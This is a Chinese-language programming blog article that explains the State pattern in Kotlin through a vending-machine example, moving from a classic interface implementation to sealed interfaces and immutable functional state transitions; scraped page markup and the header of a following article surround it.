.tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ed296ecb41543039d5405088a4b8c43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768178812&amp;x-signature=fhy2b8bYrAbNNRJ2nFf2XtIJbP8%3D" alt="1.png" loading="lazy"/></p>
<p>你是否管理过那些根据内部状态发生剧烈行为变化的复杂对象？</p>
<p>如果是，那你很可能已经和一个常见敌人斗争过——遍布你类中每个方法的、冗长的 <code>when</code> 语句。</p>
<p>它看起来大概是这样的：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleAction</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">when</span> (state) {
        State.A -&gt; { <span class="hljs-comment">/* A 的逻辑 */</span> }
        State.B -&gt; { <span class="hljs-comment">/* B 的逻辑 */</span> }
        State.C -&gt; { <span class="hljs-comment">/* C 的逻辑 */</span> }
        <span class="hljs-comment">// ... 还在不断增长！</span>
    }
}
</code></pre>
<p>每次你添加一个新状态（比如 <code>State.D</code>），你就得逐个追踪并更新每一个函数，加入新的分支。</p>
<p>这是个维护噩梦，直接违反了开闭原则（<strong>OCP</strong>），也是一种严重的代码异味。你的逻辑本该按状态分组，却因为动作而被散乱地分布在各处。</p>
<p>那么，解决方案是什么呢？</p>
<p>状态模式。而且借助现代 Kotlin，我们可以用最少的样板代码，实现最优雅的状态模式。</p>
<h2 data-id="heading-0">一个简单的自动售货机</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ff32e73dc554e92bcbb7bbc60d105e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768178812&amp;x-signature=Lj6Kgj5yM%2BLbhf8%2BWJDlzh3LWCo%3D" alt="0.png" loading="lazy"/></p>
<p>让我们想象一下，我们正在构建一个简单的 <code>VendingMachine</code>。它有几个关键的状态和动作：</p>
<ul>
<li><strong>状态</strong>：<code>IDLE</code>（空闲）、<code>HAS_MONEY</code>（已投币）、<code>OUT_OF_STOCK</code>（缺货）</li>
<li><strong>动作</strong>：<code>insertMoney</code>（投币）、<code>selectProduct</code>（选择商品）、<code>requestRefund</code>（请求退款）</li>
</ul>
<p>下面是那种存在问题的、基于状态的检查代码：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingMachine</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> balance: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> state: State = State.IDLE
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-keyword">when</span> (state) {
            State.IDLE -&gt; {
                balance += amount
                state = State.HAS_MONEY
                println(<span class="hljs-string">"已投币。余额：<span class="hljs-variable">$balance</span>"</span>)
            }
            State.HAS_MONEY -&gt; {
                println(<span class="hljs-string">"已投币，无需重复投币。余额：<span class="hljs-variable">$balance</span>"</span>)
            }
            State.OUT_OF_STOCK -&gt; {
                println(<span class="hljs-string">"机器缺货。"</span>)
            }
        }
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">when</span> (state) {
            State.IDLE -&gt; {
                println(<span class="hljs-string">"请先投币。"</span>)
            }
            State.HAS_MONEY -&gt; {
                <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* 商品可用 */</span>) {
                    println(<span class="hljs-string">"商品已售出。"</span>)
                    state = State.IDLE
                } <span class="hljs-keyword">else</span> {
                    println(<span class="hljs-string">"商品不可用。"</span>)
                }
            }
            State.OUT_OF_STOCK -&gt; {
                println(<span class="hljs-string">"机器缺货。"</span>)
            }
        }
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">when</span> (state) {
            State.IDLE -&gt; {
                println(<span class="hljs-string">"没有可退的款项。"</span>)
            }
            State.HAS_MONEY -&gt; {
                println(<span class="hljs-string">"已退款：<span class="hljs-variable">$balance</span>"</span>)
                balance = <span class="hljs-number">0</span>
                state = State.IDLE
            }
            State.OUT_OF_STOCK -&gt; {
                println(<span class="hljs-string">"没有可退的款项。"</span>)
            }
        }
    }
}
</code></pre>
<p>如果我们新增一个 <code>MAINTENANCE</code>（维护）状态，就会破坏开闭原则，因为我们必须修改 <code>insertMoney</code>、<code>selectProduct</code> 以及所有其他动作方法。</p>
<h2 data-id="heading-1">经典的状态模式</h2>
<p>状态模式通过将“状态”本身变成一个持有行为的对象来解决这个问题。我们希望按状态来组织行为，而不是按动作。</p>
<h3 data-id="heading-2">1. 定义接口</h3>
<p>我们定义一个通用的接口（<code>MachineState</code>），所有状态对象都必须实现它。这个接口包含了上下文（<code>VendingMachineContext</code>）可以执行的所有可能动作。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MachineState</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">(context: <span class="hljs-type">VendingMachineContext</span>)</span></span>
}
</code></pre>
<h3 data-id="heading-3">2. 具体实现</h3>
<p>我们为每个状态实现其行为。关键点在于：单个状态的所有逻辑现在都集中在一个类/对象中。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">object</span> IdleState : MachineState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        context.balance += amount
        context.state = HasMoneyState
        println(<span class="hljs-string">"已投币。余额：<span class="hljs-subst">${context.balance}</span>"</span>)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"请先投币。"</span>)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">(context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"没有可退的款项。"</span>)
    }
}

<span class="hljs-keyword">object</span> HasMoneyState : MachineState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        context.balance += amount
        println(<span class="hljs-string">"已添加金额。余额：<span class="hljs-subst">${context.balance}</span>"</span>)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        <span class="hljs-keyword">if</span> (context.balance &gt;= <span class="hljs-number">2</span>) {
            context.balance -= <span class="hljs-number">2</span>
            println(<span class="hljs-string">"商品已售出。"</span>)
            context.state = IdleState
        } <span class="hljs-keyword">else</span> {
            println(<span class="hljs-string">"商品不可用。"</span>)
        }
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">(context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"已退款：<span class="hljs-subst">${context.balance}</span>"</span>)
        context.balance = <span class="hljs-number">0</span>
        context.state = IdleState
    }
}

<span class="hljs-keyword">object</span> OutOfStockState : MachineState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"机器缺货。"</span>)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"机器缺货。"</span>)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">(context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        println(<span class="hljs-string">"没有可退的款项。"</span>)
    }
}
</code></pre>
<h3 data-id="heading-4">3. 上下文</h3>
<p><code>VendingMachineContext</code>（即上下文）现在变得简洁，只需将动作委托给其当前的状态对象即可。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingMachineContext</span>(<span class="hljs-keyword">var</span> balance: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">var</span> state: MachineState = IdleState
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertMoney</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>)</span></span> {
        state.insertMoney(amount, <span class="hljs-keyword">this</span>)
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectProduct</span><span class="hljs-params">(code: <span class="hljs-type">String</span>)</span></span> {
        state.selectProduct(code, <span class="hljs-keyword">this</span>)
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">requestRefund</span><span class="hljs-params">()</span></span> {
        state.requestRefund(<span class="hljs-keyword">this</span>)
    }
    <span class="hljs-comment">// 辅助函数，供状态对象切换机器状态</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">transitionTo</span><span class="hljs-params">(newState: <span class="hljs-type">MachineState</span>)</span></span> {
        <span class="hljs-keyword">this</span>.state = newState
    }
}
</code></pre>
<p>如果你新增一个状态，只需创建一个新的类。你无需修改 <code>VendingMachineContext</code> 或其他任何状态类。开闭原则得到了恢复！</p>
<h2 data-id="heading-5">增强的 Kotlin 风格状态模式</h2>
<p>经典模式很可靠，但 Kotlin 为我们提供了更强大、更优雅的方式来构建它：使用
<strong>密封接口</strong>
来强制实现类型安全的命令。</p>
<h3 data-id="heading-6">1. 定义所有输入</h3>
<p>我们使用密封接口来建模机器可以接收的所有可能输入：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">VendingInput</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsertMoney</span>(<span class="hljs-keyword">val</span> amount: <span class="hljs-built_in">Int</span>) : VendingInput
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectProduct</span>(<span class="hljs-keyword">val</span> code: String) : VendingInput
    <span class="hljs-keyword">object</span> RequestRefund : VendingInput
}
</code></pre>
<h3 data-id="heading-7">2. 定义状态和上下文</h3>
<p>状态接口现在接受一个单一的 <code>VendingInput</code>。上下文拥有一个公开的 <code>process</code> 方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">VendingState</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingMachineContext</span>(<span class="hljs-keyword">var</span> balance: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">var</span> state: VendingState = IdleState
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">process</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>)</span></span> {
        state.handle(input, <span class="hljs-keyword">this</span>)
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">transitionTo</span><span class="hljs-params">(newState: <span class="hljs-type">VendingState</span>)</span></span> {
        <span class="hljs-keyword">this</span>.state = newState
    }
}
</code></pre>
<h3 data-id="heading-8">3. 行为</h3>
<p>状态对象使用一个对 <code>input</code> 类型的单一 <code>when</code> 语句。因为 <code>VendingInput</code> 是密封的，Kotlin 会强制我们处理所有可能的输入——这使得我们的代码变得穷举且安全！</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">object</span> IdleState : VendingState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        <span class="hljs-keyword">when</span> (input) {
            <span class="hljs-keyword">is</span> VendingInput.InsertMoney -&gt; {
                context.balance += input.amount
                context.transitionTo(HasMoneyState)
                println(<span class="hljs-string">"已投币。余额：<span class="hljs-subst">${context.balance}</span>"</span>)
            }
            <span class="hljs-keyword">is</span> VendingInput.SelectProduct -&gt; {
                println(<span class="hljs-string">"请先投币。"</span>)
            }
            VendingInput.RequestRefund -&gt; {
                println(<span class="hljs-string">"没有可退的款项。"</span>)
            }
        }
    }
}

<span class="hljs-keyword">object</span> HasMoneyState : VendingState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        <span class="hljs-keyword">when</span> (input) {
            <span class="hljs-keyword">is</span> VendingInput.InsertMoney -&gt; {
                context.balance += input.amount
                println(<span class="hljs-string">"已添加金额。余额：<span class="hljs-subst">${context.balance}</span>"</span>)
            }
            <span class="hljs-keyword">is</span> VendingInput.SelectProduct -&gt; {
                <span class="hljs-keyword">if</span> (context.balance &gt;= <span class="hljs-number">2</span>) {
                    context.balance -= <span class="hljs-number">2</span>
                    println(<span class="hljs-string">"商品已售出。"</span>)
                    context.transitionTo(IdleState)
                } <span class="hljs-keyword">else</span> {
                    println(<span class="hljs-string">"商品不可用。"</span>)
                }
            }
            VendingInput.RequestRefund -&gt; {
                println(<span class="hljs-string">"已退款：<span class="hljs-subst">${context.balance}</span>"</span>)
                context.balance = <span class="hljs-number">0</span>
                context.transitionTo(IdleState)
            }
        }
    }
}

<span class="hljs-keyword">object</span> OutOfStockState : VendingState {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>, context: <span class="hljs-type">VendingMachineContext</span>)</span></span> {
        <span class="hljs-keyword">when</span> (input) {
            <span class="hljs-keyword">is</span> VendingInput.InsertMoney -&gt; {
                println(<span class="hljs-string">"机器缺货。"</span>)
            }
            <span class="hljs-keyword">is</span> VendingInput.SelectProduct -&gt; {
                println(<span class="hljs-string">"机器缺货。"</span>)
            }
            VendingInput.RequestRefund -&gt; {
                println(<span class="hljs-string">"没有可退的款项。"</span>)
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-9">纯函数式状态转换</h2>
<p>对于真正健壮的系统（如 <strong>MVI</strong>），你可能希望避免可变性。你可以通过让状态函数返回下一个状态来实现这一点，从而使系统具有高度确定性：</p>
<h3 data-id="heading-10">1. 定义转换</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 定义所有输入（保持不变，密封接口非常适合函数式）</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">VendingInput</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsertMoney</span>(<span class="hljs-keyword">val</span> amount: <span class="hljs-built_in">Int</span>) : VendingInput
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectProduct</span>(<span class="hljs-keyword">val</span> code: String) : VendingInput
    <span class="hljs-keyword">object</span> RequestRefund : VendingInput
}

<span class="hljs-comment">// 2. 定义状态：将数据（balance）与状态逻辑结合</span>
<span class="hljs-comment">// 使用不可变属性 (val)，确保状态一旦创建不可修改</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingState</span>(<span class="hljs-keyword">val</span> balance: <span class="hljs-built_in">Int</span>) {
    
    <span class="hljs-comment">// 核心转变：函数签名返回 (新状态, 产生的结果文本)</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>)</span></span>: Pair&lt;VendingState, String&gt;

    <span class="hljs-comment">// --- 各个状态的具体实现 ---</span>

    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Idle</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> b: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>) : VendingState(b) {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>)</span></span> = <span class="hljs-keyword">when</span> (input) {
            <span class="hljs-keyword">is</span> VendingInput.InsertMoney -&gt; 
                HasMoney(balance + input.amount) to <span class="hljs-string">"已投币。余额：<span class="hljs-subst">${balance + input.amount}</span>"</span>
            <span class="hljs-keyword">is</span> VendingInput.SelectProduct -&gt; 
                <span class="hljs-keyword">this</span> to <span class="hljs-string">"请先投币。"</span>
            VendingInput.RequestRefund -&gt; 
                <span class="hljs-keyword">this</span> to <span class="hljs-string">"没有可退的款项。"</span>
        }
    }

    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HasMoney</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> b: <span class="hljs-built_in">Int</span>) : VendingState(b) {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>)</span></span> = <span class="hljs-keyword">when</span> (input) {
            <span class="hljs-keyword">is</span> VendingInput.InsertMoney -&gt; 
                copy(b = balance + input.amount) to <span class="hljs-string">"已添加金额。余额：<span class="hljs-subst">${balance + input.amount}</span>"</span>
            <span class="hljs-keyword">is</span> VendingInput.SelectProduct -&gt; 
                <span class="hljs-keyword">if</span> (balance &gt;= <span class="hljs-number">2</span>) Idle(balance - <span class="hljs-number">2</span>) to <span class="hljs-string">"商品已售出：<span class="hljs-subst">${input.code}</span>。"</span>
                <span class="hljs-keyword">else</span> <span class="hljs-keyword">this</span> to <span class="hljs-string">"余额不足。"</span>
            VendingInput.RequestRefund -&gt; 
                Idle(<span class="hljs-number">0</span>) to <span class="hljs-string">"已退款：<span class="hljs-variable">$balance</span>"</span>
        }
    }

    <span class="hljs-keyword">object</span> OutOfStock : VendingState(<span class="hljs-number">0</span>) {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(input: <span class="hljs-type">VendingInput</span>)</span></span> = <span class="hljs-keyword">this</span> to <span class="hljs-string">"机器缺货。"</span>
    }
}
</code></pre>
<h3 data-id="heading-11">2. 使用举例</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> s0 = VendingState.Idle()

    <span class="hljs-comment">// 所有的处理结果都作为新值返回，原始 s0 保持不变</span>
    <span class="hljs-keyword">val</span> (s1, msg1) = s0.handle(VendingInput.InsertMoney(<span class="hljs-number">5</span>))
    println(msg1) <span class="hljs-comment">// 已投币。余额：5</span>

    <span class="hljs-keyword">val</span> (s2, msg2) = s1.handle(VendingInput.SelectProduct(<span class="hljs-string">"可乐"</span>))
    println(msg2) <span class="hljs-comment">// 商品已售出：可乐。</span>

    <span class="hljs-comment">// s2 现在是 Idle 状态，余额已扣除</span>
    println(<span class="hljs-string">"最终状态: <span class="hljs-subst">${s2::class.simpleName}</span>, 余额: <span class="hljs-subst">${s2.balance}</span>"</span>)
}

</code></pre>
<p>虽然更复杂，但这种方法在响应式架构中很常见，因为状态变化是必须被精确跟踪的事件。</p>
<p>它的核心实际上就是函数有状态的返回，而状态本身是不可变的，如果同一个状态的数据发生变化，会生成一个新的状态。</p>
<h2 data-id="heading-12">总结</h2>
<p>通过应用状态模式，我们成功地将分散、脆弱的条件逻辑替换为干净、内聚的状态对象。这使得我们的代码更易于维护、测试和扩展。</p>
<p>如果你的 Kotlin 代码库正遭受“臃肿的 <code>when</code> 语句”之苦，不妨试试状态模式。团队中的小伙伴一定会感谢你的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从活动编排到积分系统：事件驱动在业务系统中的一次延伸]]></title>    <link>https://juejin.cn/post/7591317772075122707</link>    <guid>https://juejin.cn/post/7591317772075122707</guid>    <pubDate>2026-01-05T02:10:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591317772075122707" data-draft-id="7589509638354632731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从活动编排到积分系统：事件驱动在业务系统中的一次延伸"/> <meta itemprop="keywords" content="后端,前端,面试"/> <meta itemprop="datePublished" content="2026-01-05T02:10:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="洛卡卡了"/> <meta itemprop="url" content="https://juejin.cn/user/888839672963544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从活动编排到积分系统：事件驱动在业务系统中的一次延伸
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888839672963544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    洛卡卡了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T02:10:51.000Z" title="Mon Jan 05 2026 02:10:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读58分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-